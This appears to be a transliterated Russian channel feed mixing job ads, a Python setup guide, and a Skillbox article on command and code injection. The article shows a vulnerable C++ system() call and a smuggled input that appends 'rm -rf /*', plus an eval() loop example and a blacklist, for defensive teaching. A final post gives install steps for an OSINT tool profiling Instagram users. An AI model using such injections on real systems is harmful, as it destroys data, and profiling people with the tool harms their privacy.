raboty s Linux  - Normal'nyi internet s vebkameroi (dlia sozvonov)   Zhelatel'no, no ne obiazatel'no (my ispol'zuem):   - opyt raboty s nginx, ansible, travis  - ELK (dlia logov)  - grafana + prometeues   Pomimo vysheperechislennykh tekhnicheskikh kachestv, my zhdem ot vas umeniia raspredeliat' sobstvennoe vremia i rasstavliat' prioritety, gotovnosti sprosit', esli chto-to neponiatno, naiti samomu, esli chego-to ne znaete.    Kak budet prokhodit' otbor:   - Vy prisylaete reziume i primery svoego koda (zhelatel'no)  - My naznachaem sobesedovanie v skype/zoom/whatever s timlidom/tekhdirom/prodaktom. Vam ponadobitsia komp s vebkameroi, chtoby my uvideli drug druga i chtoby obsudit' primery koda  - Na sobesedovanii budut tekhnicheskie voprosy, no bez zhesti tipa programmirovaniia na listochke (no eto kak khotite)  - Po rezul'tatam sobesedovaniia, vozmozhno, poprosim vypolnit' nebol'shoe domashnee testovoe zadanie   Usloviia:   - Vozmozhnost' rabotat' udalenno (nout ili komp vydadim, esli neobkhodim)  - Interesnye zadachi  - Adekvatnyi i gramotnyi menedzhment  - Professional'nye i dobrozhelatel'nye kollegi  - Udobnyi ofis v tsentre (m. Tsvetnoi Bul'var, Trubnaia) - prisutstvie v ofise po zhelaniiu  - Demokratichnaia atmosfera  - Kofe, iogurty, frukty, pechen'ki  - Zarplata ukazana sredniaia, gotovy obsuzhdat' bolee vysokuiu stavku    Dostupno soiskateliam s invalidnost'iu  Otkliknut'sia: hr@directadvert.ru

Kak ispol'zovat' v svoei povsednevnoi rabote vektornye semanticheskie modeli i biblioteku Word2Vec? Eto neslozhno: ponadobitsia nemnogo koda na Python i (dlia vtoroi chasti) gotovye vektornye modeli -- naprimer, s saita RusVectores. Publikuem nash t'iutorial po Word2vec  #knowhow@sysblok

S udovol'stviem i dazhe gordost'iu publikuem etu stat'iu. Vo-pervykh, potomu chto avtor -- uchastnitsa nashei programmy Summ3r of h4ck, Nalen98. A vo-vtorykh, potomu chto eto issledovatel'skaia rabota s prodolzheniem, chto vdvoine interesnee. Ssylka na pervuiu chast'.

Na dniakh v seti poiavilos' opisanie original'nogo DIY-proekta na osnove Raspberry Pi i svetodiodnykh panelei. Tsel' proekta -- vizualizirovat' uroven' zagruzki protsessora PK. Dlia etogo ispol'zuiutsia animatsiia na LED-paneliakh samodel'nogo ustroistva.

Odnazhdy u menia poiavilas' ideia. Eta ideia voplotilas' v proekte PiAlert. Uznat' o tom, chto eto takoe, vy mozhete iz etogo video. Esli rasskazat' o PiAlert v dvukh slovakh, to okazhetsia, chto eto ustroistvo, na kotorom, esli proiskhodiat popytki vtorzheniia na servery, zagoraiutsia raznotsvetnye lampochki. Sistema podschityvaet obshchee kolichestvo takikh sobytii. Ia, v osnovnom, nabliudal za popytkami podkliucheniia k 22 (SSH) portu moikh serverov. Obychno eti sobytiia iavliaiutsia rezul'tatom deiatel'nosti botov. Za sutki na odnom iz moikh VPS, gde byla vkliuchena obychnaia sistema vkhoda v nego, bylo zafiksirovano 1633 popytki vtorzheniia. Na eshchio odnom servere, gde primenialsia vkhod v sistemu bez parolia, s ispol'zovaniem SSH-kliucha, bylo zafiksirovano 9 atak. Odin raz byla obnaruzhena popytka nesanktsionirovannogo vkhoda v panel' upravleniia WordPress-proekta. V vysheupomianutom video pokazano ispytanie sistemy do eio vyvoda v rabochii rezhim.

!! Python razrabotchik (SberDevices) SberDevices -- unikal'noe IT-prostranstvo vnutri Sberbanka. My zanimaemsia razrabotkoi golosovykh produktov, umnykh ustroistv i virtual'nykh personazhei. Naprimer, my razrabotali okko SmartBox i prodolzhaem ego razvivat', a na podkhode novye ustroistva, eshche bolee ambitsioznye. v rabote my ispol'zuem sovremennye tekhnologii, privetstvuem v komande liubye interesnye idei i kazhdye igrok komandy mozhet vlozhit' v ustroistvo chto-to svoe. My ishchem Python razrabotchika so znaniem bazovykh algoritmov ml i opytom analiza metrik kachestva modelei mashinnogo obucheniia v komandu, zanimaiushchuiusia razrabotkoi produktov, sviazannykh s biometriei i komp'iuternym zreniem. Zadachi:  Razrabotka skriptov dlia obrabotki i analiza massivov dannykh (izobrazheniia i zvuk) dlia komandy Data Science Podgotovka i strukturirovanie testovykh i obuchaiushchikh datasetov, vedenie reestra dannykh Otsenka kachestva i skorosti biometricheskikh algoritmov, sravnenie modelei, vedenie reestra modelei Razvitie i podderzhka biometricheskikh servisov i prilozhenii Vzaimodeistvie s R&D, analitikami, inzhenerami tekhnicheskoi podderzhki  Nashi ozhidaniia:  Vladenie Python3 na vysokom urovne, dostatochnom dlia promyshlennogo programmirovaniia Opyt raboty s bibliotekami matematicheskikh raschetov i analiza dannykh (NumPy, SciPy, Pandas) Opyt raboty s bibliotekami obrabotki izobrazhenii i zvuka (OpenCV, SoundFile, LibROSA i t.p.) Znanie i opyt primeneniia algoritmov mashinnogo obucheniia (ml, dl) Vladenie Jupyter Notebook Vladenie Linux shell Opyt ispol'zovaniia Git, Jira, Confluence Zhelatelen opyt razrabotki veb-prilozhenii (JavaScript, html, Nginx, aiohttp/tornado) Zhelanie samostoiatel'no razbirat'sia v slozhnykh zadachakh, novykh tekhnologiiakh i predmetnykh oblastiakh Zhelatelen opyt raboty v krupnykh kompaniiakh    Usloviia:    Professional'noe obuchenie, seminary, treningi, konferentsii, korporativnaia biblioteka. dms, strakhovanie zhizni. Samye innovatsionnye, ambitsioznye proekty i zadachi. Svobodnyi dress-kod. Gibkii grafik dlia optimal'nogo balansa raboty i lichnoi zhizni. L'gotnye kredity i korporativnye skidki. Konkurentnaia kompensatsiia (oklad i premii po rezul'tatam deiatel'nosti). Pochemu opasno ispol'zovat' funktsii system(), eval() ili exec() i kak zashchitit'sia ot in'ektsii koda Razbiraemsia, pochemu odnu iz samykh poleznykh vozmozhnostei sovremennykh iazykov programmirovaniia nuzhno ispol'zovat' s ostorozhnost'iu. V bol'shinstve sovremennykh iazykov programmirovaniia est' funktsii, kotorye pozvoliaiut vypolnit' kakuiu-nibud' komandu operatsionnoi sistemy ili zapustit' kod: system () v C++; eval () v JavaScript; exec () v PHP; os.system () v Python i tak dalee. Naprimer, s pomoshch'iu odnoi strochki na C++, soderzhashchei system (), mozhno v graficheskoi obolochke Gnome pokazat' uvedomlenie pol'zovateliu: //Vyvod opoveshcheniia v obolochke rabochego stola GNOME dlia Linux system("notify-send 'Hello, World!'"); Eto ochen' udobno, potomu chto inache prishlos' by sozdavat' otdel'noe okno, ukazyvat' ego raspolozhenie na ekrane, zakryvat' cherez opredelionnoe vremia i tak dalee. Vy mozhete peredat' v system () liubuiu vstroennuiu komandu operatsionnoi sistemy ili vneshniuiu programmu, ustanovlennuiu na komp'iutere. Oni budut vypolniat' vse te deistviia, na kotorye sposobna vasha OS: sozdavat', udaliat', peremeshchat' faily i papki, vykliuchat' komp'iuter, otkryvat' drugie programmy i mnogoe drugoe. Mozhno, naprimer, sozdat' videoredaktor, pochti ne zadumyvaias' o tom, kak proiskhodit rabota s samim failom. Dlia etogo dostatochno s pomoshch'iu system () peredat' programme ffmpeg neobkhodimye argumenty. Ostaiotsia lish' sozdat' graficheskii interfeis, i prilozhenie gotovo. >Pochemu eto nebezopasno Chashche vsego stroka, soderzhashchaia komandu, kotoruiu neobkhodimo vypolnit' vyzovom system (), formiruetsia s dobavleniem kakikh-libo dannykh. Eto mozhet byt' tekst uvedomleniia ili argumenty dlia drugoi programmy. Zatem system () zapuskaet komandnuiu obolochku (Bourne Shell ili analogichnuiu) i peredaiot komandu ei. Eto pozvoliaet poluchit' pochti polnyi dostup k sisteme. Vazhno! Esli u pol'zovatelia est' vozmozhnost' povliiat' na peredavaemye funktsii system () dannye, on mozhet popytat'sia sdelat' komandnuiu in'ektsiiu (angl. Command injection ili Shell injection) -- dobavit' k dannym vredonosnye instruktsii, kotorye budut vypolneny v obolochke. Rassmotrim fragment koda na C++: //Sprashivaem pol'zovatelia, kakoe soobshchenie on khochet vyvesti string input; cout << "Your message: "; //Poluchaem vvod getline(cin, input); //Formiruem komandu string s = "notify-send '" + input + "'"; //Preobrazuem stroku v prinimaemyi funktsiei system() tip dannykh const char [club19215441|*command] = s.c_str(); //Zapuskaem komandu system(command); Krome samogo teksta soobshcheniia, vzlomshchik mozhet vvesti i chto-nibud' nezhelatel'noe i dazhe opasnoe. Naprimer, vot takoi fragment: Hello!' && rm -rf /* && echo 'a V itoge obolochka poluchit tri komandy vmesto odnoi: notify-send 'Hello!' -- vyvod uvedomleniia, zadumannyi razrabotchikami. rm -rf /* -- udalenie vsekh failov na komp'iutere. echo 'a -- vyvod bukvy a. Eta komanda nuzhna dlia togo, chtoby ne bylo konfliktov s kavychkami. Konechno, vriad li kto-to budet delat' chto-nibud' podobnoe na svoiom ustroistve. No vasha programma mozhet rabotat' i na servere. Vot primer dlia saita, napisannyi na Python: #!/usr/bin/env python3 import os print("Content-type: text/html") print() print("

Hello world!

") os.system("notify-send 'Hello!'") Kazhdyi raz, kogda pol'zovateli budut zakhodit' na etu stranitsu, na servere budet vyvodit'sia uvedomlenie. Etot primer nemnogo nadumannyi, potomu chto na serverakh obychno ne ustanavlivaiut obolochku rabochego stola. No est' i drugie pokhozhie uiazvimosti, kotorye ne trebuiut GUI, no mogut ispol'zovat'sia dlia vzloma. V veb-prilozheniiakh funktsii vrode os.system () nuzhny ochen' redko, no posledstviia ikh nebrezhnogo ispol'zovaniia mogut okazat'sia ves'ma ser'ioznymi: utechka dannykh pol'zovatelei, polomka oborudovaniia, poteria pribyli i tak dalee. Dazhe esli programma zapushchena ne ot root i razrushitel'noe deistvie napriamuiu nevozmozhno, vzlomshchik mozhet vypolnit' eskalatsiiu privilegii (angl. Privilege escalation) -- s pomoshch'iu izvestnykh uiazvimostei poluchit' povyshennyi uroven' dostupa k sisteme. Perechen' takikh nezakrytykh lazeek vremia ot vremeni publikuetsia na razlichnykh khakerskikh saitakh. Chto kasaetsia iazykov, kotorye ne imeiut dostupa k komandnoi obolochke (naprimer, JavaScript v brauzere), to v nikh vozmozhna in'ektsiia koda (angl. Code injection) -- peredacha vredonosnogo koda tekushchei programme. Samyi prostoi primer -- popytka vvesti JavaScript-kod v kakuiu-nibud' formu na saite. Naprimer, vzlomshchik mozhet ostavit' kommentarii sleduiushchego vida: Hello! Pol'zovateli, kotorye budut otkryvat' stranitsu s etim kommentariem, budut perenapravliat'sia na drugoi sait. Drugoi primer -- funktsiia eval () v JavaScript: //Komandy, kotorye prishli s servera //K osnovnym instruktsiiam popal kod, kotoryi delaet nevozmozhnoi normal'nuiu rabotu saita commands = "Foo(); Bar(); while(true) { alert(1); }"; //Vypolnenie peredannykh komand eval(commands); Sposoby vvedeniia in'ektsii primerno te zhe samye. Kak zashchitit'sia ot in'ektsii koda Esli dlia raboty vashei programmy neobkhodimy funktsii vrode system () ili eval (), to nuzhno vypolnit' validatsiiu vsekh vvodimykh dannykh -- proverit' ikh na sootvetstvie opredelionnym trebovaniiam. Osnovnye sposoby validatsii i zashchity ot in'ektsii koda: Sozdanie chiornogo spiska. Blokiruite vvod, esli znachenie nakhoditsia v chiornom spiske ili chastichno sostoit iz zapreshchionnykh dannykh (naprimer, Hello! , rm -rf /*). Sozdanie belogo spiska. Blokiruite vvod, esli vvedionnye pol'zovatelem dannye ne vstrechaiutsia v belom spiske. Ekranirovanie. Preobrazuite spetsial'nye simvoly v ikh kodovoe predstavlenie (> zameniat' na & #62;) ili ekraniruite ikh (" zameniat' na \"). Proverka formata. Proveriaite, chtoby soobshchenie vvodilos' v opredelionnom formate. Naprimer, telefonnyi nomer mozhet vygliadet' tak: 8 (800) 555-35-35. Ogranichenie dliny. Udaliaite vse lishnie simvoly, esli dlina stroki prevyshaet kakoe-libo znachenie. Obrezka teksta. Udaliaite vse probely v nachale i kontse stroki. Ispol'zuite direktivu use strict i podobnye. Soobshchite interpretatoru, chtoby on bolee strogo reagiroval na oshibki v kode. V zavisimosti ot osobennostei prilozheniia mogut pomoch' i drugie sposoby zashchity. Naprimer, esli est' baza dannykh, to imeet smysl ispol'zovat' khranimye protsedury. Esli zhe eto onlain-igra, to nuzhno proveriat' spisok podkliuchionnykh DLL. Vazhno! Zadeistvovat' kakoi-to odin iz perechislennykh sposobov, skoree vsego, ne pomozhet -- zloumyshlennik mozhet naiti drugie neprikrytye lazeiki. Podkhodite k zashchite kompleksno, staraites' ispol'zovat' srazu neskol'ko metodov. I ne zabyvaite sledit' za tem, kakie prava est' u vashego prilozheniia. Eto ne pozvolit vzlomshchiku nanesti ser'ioznyi ushcherb, esli emu vsio zhe udastsia vvesti in'ektsiiu koda. Za stat'iu spasibo:https://skillbox.ru/ #Kar'era

#npm_matmod #npm_praktika #npm_rekomendatsii  Proshche vsego ustanovit' sborku Anaconda, v nei srazu idet interpretator + proverennaia sborka paketov dlia raboty s dannymi i nauchnykh vychislenii.   Po ssylke mozhno skachat' https://www.anaconda.com/products/individual, vnizu est' Anaconda Installers, neobkhodimo vybrat' ustanovshchik dlia svoei operatsionnoi sistemy (windows, mac, linux) i protsessora (32, 64 bit). Pri ustanovke luchshe nazhat' galochku ADD to PATH, togda komandnaia stroka budet ponimat' komandy k conda, mozhno budet ustanavlivat' pakety i zapuskat' programmy Anaconda cherez komandnuiu stroku.    Posle ustanovki v puske poiavitsia papka Anaconda. V nei est' neskol'ko udobnykh instrumentov:  Jupyter Notebook - sreda dlia sozdaniia interaktivnykh zapisnykh knizhek s podderzhkoi Python i iazykov razmetki. Ispol'zuetsia v nauchnoi srede dlia sozdaniia primerov i opisanii raboty programm. Mozhno programmirovat' v nem i sozdavat' prostye programmy, no v nem net udobnoi sredy programmirovaniia, proverki koda i otladchika.  Spyder - sreda dlia sozdaniia programm na Python, est' bazovaia inspektsiia koda i otladchik, podkhodit dlia sozdaniia nebol'shikh programm.    Dlia udobnogo programmirovaniia rekomenduiu takzhe ustanovit' polnotsennuiu sredu dlia razrabotki Pycharm. Po ssylke mozhno skachat': https://www.jetbrains.com/pycharm/download/#section=windows - nuzhno vybirat' Community besplatnuiu versiiu, ee vpolne khvataet dlia vsekh zadach, professional - platnaia (kstati dlia uchebnykh zavedenii mozhno poluchit' besplatno esli est' e-mail na domene univera).    Posle ustanovki i zapuska Pycharm, nuzhno vybrat' papku gde budet nash proekt. Neobkhodimo takzhe nastroit' put' k interpretatoru - dlia etogo zakhodim v File-Settings-Project-Python Interpreter, nazhimaem na znachok instrumenta - add. V novom okne perekhodil vo vkladku Conda Environment, vybiraem Existing environment i v puti k interpretatoru ukazyvaem put' k C:\Users\IMIa PROFILIa\anaconda3\python3.exe, nazhimaem galochku Make available for all projects i nazhimaem OK. Posle etogo v spiske intepretatorov vybiraem dobavlennyi nazhimaem Apply i OK. Dalee nuzhno budet podozhdat' poka Pycharm proindeksiruet intpretator i zatem mozhno nachinat' rabotu.   Besplatnye kursy dlia izucheniia iazyka programmirovaniiaPython:  1) Bazovyi kurs ot Instituta Bioinformatiki - https://stepik.org/course/67/syllabus (v tom chisle rasskazyvaetsia kak skachat' i nastroit' Python)  2) Interaktivnyi uchebnik pro bazovye operatsii v Python so 100 zadachami, rabotaet v brauzere - http://pythontutor.ru/  3) Prodvinutyi kurs ot Instituta Bioinformatiki - https://stepik.org/course/512/syllabus  4) Bazovyi kurs ot VShE - https://ru.coursera.org/learn/python-osnovy-programmirovaniya  5) Spetsializatsiia <<Programmirovanie na Python>> ot Mail.ru i MFTI, sostoit iz 4 prodvinutykh kursov, chastichno besplatnaia -https://ru.coursera.org/specializations/programming-in-python  + https://pythonworld.ru/ + stackoverflow + ofitsial'naia dokumentatsiia iazyka https://docs.python.org/3/index.html   Luchshe nachat' s 1 kursa, tam rasskazyvaiutsia bazovye veshchi pro operatory, peremennye, usloviia, tsikly, tipy dannykh, parallel'no mozhno reshat' zadachi po 2 ssylke.  V 4 ssylke primerno tozhe samoe chto i v 1.  Prodvinutyi kurs 3 luchshe ne nachinat', esli v tselom plokho znakom s programmirovaniem, tam vkrattse rasskazyvaetsia kak rabotaet iazyk, pro klassy, obrabotku oshibok i osnovnye biblioteki i instrumenty.  5 - eto esli khochesh' doskonal'no razobrat'sia i stat' progerom

Poluchaem polnuiu informatsiiu o pol'zovatele Instagram  OSINT - Instagram profilia Dannaia utilita pozvolit vam uznat' podkliuchen li profil' k facebook,  datu registratsii, est' li biznes-akkaunt u profilia, kategoriiu akkaunta, kolichestvo soobshchenii i mnogo drugoi informatsii.  Instruktsiia: pkg install -y git Kloniruem repozitorii i perekhodim k skriptu: git clone https://github.com/th3unkn0n/osi.ig.git && cd osi.ig Aktiviruem: chmod +x install.sh && ./install.sh Ispol'zovanie: python3 main.py -u username python3 main.py -h Spravka: --help
